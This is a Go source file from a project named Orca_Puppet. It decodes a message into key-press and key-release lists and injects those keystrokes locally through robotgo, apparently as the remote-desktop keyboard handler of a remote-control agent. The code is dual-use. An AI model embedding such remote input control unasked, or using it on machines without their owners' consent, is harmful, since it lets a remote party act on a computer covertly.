package rdesktopopt

import (
	"Orca_Puppet/cli/common"
	"encoding/json"
	"github.com/go-vgo/robotgo"
)

type KeyboardInfo struct {
	PressKey   []string
	ReleaseKey []string
}

// 获取键盘信息
func GetKeyboardInfo(message string) KeyboardInfo {
	var keyboardInfo KeyboardInfo
	_, _, data := common.SettleRetDataBt(message)
	json.Unmarshal(data, &keyboardInfo)
	return keyboardInfo
}

// 处理键盘动作
func SettleKeyboardAction(keyboardInfo KeyboardInfo) {
	if keyboardInfo.PressKey != nil {
		for _, key := range keyboardInfo.PressKey {
			robotgo.MilliSleep(10)
			err := robotgo.KeyDown(key)
			if err != nil {
				return
			}
		}
	}
	if keyboardInfo.ReleaseKey != nil {
		for _, key := range keyboardInfo.ReleaseKey {
			robotgo.MilliSleep(10)
			err := robotgo.KeyUp(key)
			if err != nil {
				return
			}
		}
	}
}
